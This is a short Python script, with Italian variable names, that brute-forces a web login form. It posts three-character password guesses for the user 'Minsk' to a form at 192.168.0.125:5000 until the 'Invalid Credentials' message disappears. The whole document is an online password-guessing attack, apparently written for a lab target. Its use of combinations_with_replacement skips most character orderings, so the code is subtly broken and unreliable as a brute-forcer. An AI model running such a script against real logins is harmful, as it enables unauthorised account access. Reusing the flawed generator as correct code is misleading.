import requests
import string
from itertools import combinations_with_replacement

N_CARATTERI_PASSWORD = 3
caratteri_possibili = list(string.ascii_lowercase + string.digits + string.ascii_uppercase)

credenziali = {
    "username" : "Minsk",
    "password": "",
    "Login": "Login"
}
for combinazione in combinations_with_replacement(caratteri_possibili, N_CARATTERI_PASSWORD):
    credenziali["password"] = ''.join(combinazione)

    r = requests.post('http://192.168.0.125:5000/', data=credenziali)

    if "Invalid Credentials" not in str(r.content):
        print(f"la password corretta è {''.join(combinazione)}")
        break



